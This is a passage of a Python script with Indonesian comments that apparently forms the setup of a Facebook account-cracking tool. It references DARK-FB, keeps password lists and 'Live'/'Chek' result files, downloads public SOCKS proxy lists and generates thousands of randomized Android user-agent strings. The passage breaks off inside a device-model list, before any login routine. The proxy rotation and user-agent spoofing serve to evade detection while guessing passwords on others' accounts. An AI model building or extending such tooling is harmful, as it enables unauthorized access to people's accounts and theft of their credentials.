###-----[ IMPORT MODULE ]-----###
import requests,json,os,sys,random,datetime,time,re,uuid,subprocess,zlib,base64,string
from time import time as tod
from time import sleep
from time import time as waktunya
from concurrent.futures import ThreadPoolExecutor as tred
from bs4 import BeautifulSoup as par
from urllib import request
from platform import platform
from urllib.error import URLError
ses = requests.Session()
###-----[ IMPORT RICH ]-----###
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich.markdown import Markdown as mark
from rich.console import Console as sol
from rich.panel import Panel as nel, Panel
from rich import print as prints
from rich.tree import Tree
from rich.console import Console
from rich.columns import Columns
wa = Console()
###-----[ APPEN AND MORE ]-----###
id,uid,uid2=[],[],[]
loop,ok,cp=0,0,0
akun,method=[],[]
uadia, uadarimu = [],[]
password_list,password_input= [],[]
pwpluss,pwnya=[],[]
upil = []
rr = random.randint
rc = random.choice
# --- [ SCRAPPING USER-AGENT LANGSUNG ] --- #
get_dulu = par(requests.post("https://www.myfakeinfo.com/mobile/get-android-device-information.php", headers={"user-agent": "Mozilla/5.0 (Linux; Android 9; ASUS_X00TD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.116 Mobile Safari/537.36"}).text,"html.parser")
hasil = [hasil_rey.text for hasil_rey in get_dulu.find_all("div",class_="col-md-10 col-sm-10 col-xs-8 xiahuaxian")]
##############################
strvrun = random.randint
uacrot1 =[f"Mozilla/5.0 (Linux; Android {str(strvrun(8,11))}; M2102J20SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(strvrun(50,111))}.0.0.0 Mobile Safari/537.36 EdgA/{str(strvrun(50,111))}.0.1661.{str(strvrun(10,59))} User Agent By Teddy Ganteng Sekali."]
uacrot1 = [f"Mozilla/5.0 (Linux; U; Android {str(strvrun(6,10))}; zh-CN; MZ-TECNO LD7j Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(strvrun(30,57))}.0.2060.{str(strvrun(50,108))} MZBrowser/{str(strvrun(1,2))}.2.001 UWS/ Mobile Safari/537.36 USER UGENT BY STRV 666"]
reyrun = random.randint
uacrot = [f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G9730) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998W) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G781U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 10; SAMSUNG SM-G965U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-A136U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36",f"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G998U) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/18.0 Chrome/{str(reyrun(40, 110))}.0.{str(reyrun(4500, 5200))}.{str(reyrun(40, 150))} Mobile Safari/537.36"]
##############################

open(".proxy.txt","w")
link_proxz=[
	"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
	"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
	"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4&timeout=10000&country=all",
	"https://raw.githubusercontent.com/UptimerBot/proxy-list/main/proxies/socks4.txt",
	"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
	"https://raw.githubusercontent.com/rdavydov/proxy-list/main/proxies/socks4.txt",
	"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks4.txt",
	"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
	"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
	"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt",
	"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
	"https://www.proxy-list.download/api/v1/get?type=socks4",
	"https://www.proxyscan.io/download?type=socks4",
	"https://api.openproxylist.xyz/socks4.txt",
	'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all',
	'https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks4.txt'
	]
link_proxz=[
	"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all",
	"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
	"https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/socks5.txt",
	"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
	"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
	"https://www.proxy-list.download/api/v1/get?type=socks5",
	"https://www.proxyscan.io/download?type=socks5",
	"https://api.openproxylist.xyz/socks5.txt",
	"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
	"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
	"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
	"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",
	"https://raw.githubusercontent.com/HyperBeats/proxy-list/main/socks5.txt",
	"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt"
	'https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all'
	'https://raw.githubusercontent.com/Denventa/sakera/main/ua.txt'
	'https://raw.githubusercontent.com/Denventa/DARK-FB/main/ua.txt']
try:
	for link in link_proxz:
		#try:
			all_prox = requests.get(link).text
			open(".proxy.txt","a+").write(all_prox)
except:
	pass
prokis=open('.proxy.txt','r').read().splitlines()
## --- [ NEW PROXY ] --- ##
try:
	proxyGraha = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt").text
	open(".proxygrah.txt","w").write(proxyGraha)
except:
	pass
prints(Panel(f"[green]{hasil}[/]",title=f"[[green]✓[/]]",style=f"bold white"))
###-----[ MENU WARNA PRINT BIASA ]-----###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
###-----[ MENU WARNA PRINT RICH ]-----###
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
###-----[ TANGGAL BULAN TAHUN ]-----###
dic = {'1':'Januari','2':'Februari','3':'Maret','4':'April','5':'Mei','6':'Juni','7':'July','8':'Agustus','9':'September','10':'Oktober','11':'November','12':'Desember'}
dic2 = {'01':'Januari','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'July','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'Live-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'Chek-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# * [ USERAGENT RANDOM ] * #
LegendOfHejo=[]
for xone in range(1000):
	rr,rc = random.randint,random.choice
	merk = str(rr(9, 14))
	versi = random.choice(["81.0.4538.131","115.0.5790.170","109.0.5414.149","115.0.5790.166","116.0.5845.90","114.0.5736.198"])
	modelnya = random.choice(["2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC"])
	user1 = f"Mozilla/5.0 (Linux; Android {merk}; {modelnya}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi} Mobile Safari/537.36"
	user2 = f"Mozilla/5.0 (Linux; Android {merk}; Lenovo YT-X705F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi} Mobile Safari/537.36"
	user3 = f"Mozilla/5.0 (Linux; Android {merk}; SCL24) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/{versi} Mobile Safari/537.36"
	LegoBatmanBerantem = str(rc([user1,user2,user3]))
	LegendOfHejo.append(user1)

LegendOfBenhek=[]
for xone in range(1000):
	rr,rc = random.randint,random.choice
	merk = str(rr(9, 14))
	verKecil1 = str(rr(190711,200720))
	heyTab = str(rr(10,45))+"."+str(rr(0,9))+"."+str(rr(0,9))+"."+str(rr(0,9))+"."+str(rr(0,9))
	miui = str(rr(10,15))+"."+str(rr(0,30))+"."+str(rr(0,9))
	models = random.choice(["RP1A","RP1A","TP1A"])
	versi = random.choice(["91.0.4472.88","100.0.4896.127","115.0.5790.170","109.0.5414.149","115.0.5790.166","116.0.5845.90","114.0.5736.198","58.0.3029.83","33.0.0.0"])
	user1 = f"Mozilla/5.0 (Linux; U; Android {merk}; in-id; RMX2189 Build/{models}.{verKecil1}.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi} Mobile Safari/537.36 HeyTapBrowser/{heyTab}"
	user2 = f"Mozilla/5.0 (Linux; U; Android {merk}; in-id; CPH2185 Build/{models}.{verKecil1}.020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{versi} Mobile Safari/537.36 HeyTapBrowser/{heyTab}"
	user3 = f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/{versi} Safari/534.24 XiaoMi/MiuiBrowser/{miui}-gn"
	LegoBatmanBeraduTytyd = str(rc([user1,user2,user3]))
	LegendOfBenhek.append(LegoBatmanBeraduTytyd)

uaaloha = []
rr,rc = random.randint,random.choice
for x in range(10000):
	versiandroid = str(rr(8,13))
	versichrome1 = str(rr(0,115))
	versichrome2 = str(rr(100,5000))
	versichrome3 = str(rr(100,200))
	models = random.choice(["CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979",
	"2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I", "22041216I", "2203121C", "2106118C", "2201123G", "2203129G", "2201122G", "2201122C", "2206122SC", "22081212C", "2112123AG", "2112123AC", "2109119BC", "M2002J9G", "M2007J1SC", "M2007J17I", "M2102J2SC", "M2007J3SY", "M2007J17G", "M2007J3SG", "M2011K2G", "M2101K9AG ", "M2101K9R", "2109119DG", "M2101K9G", "2109119DI", "M2012K11G", "M2102K1G", "21081111RG", "2107113SG", "21051182G", "M2105K81AC", "M2105K81C", "21061119DG", "21121119SG", "22011119UY", "21061119AG", "21061119AL", "22041219NY", "22041219G", "21061119BI", "220233L2G", "220233L2I", "220333QNY", "220333QAG", "M2004J7AC", "M2004J7BC", "M2004J19C", "M2006C3MII", "M2010J19SI", "M2006C3LG", "M2006C3LVG", "M2006C3MG", "M2006C3MT", "M2006C3MNG", "M2006C3LII", "M2010J19SL", "M2010J19SG", "M2010J19SY", "M2012K11AC", "M2012K10C", "M2012K11C", "22021211RC","RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269","RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921",
	"X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])
	sam = random.choice(["E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U","G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U","S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN"])
	sam1 = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550 5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N80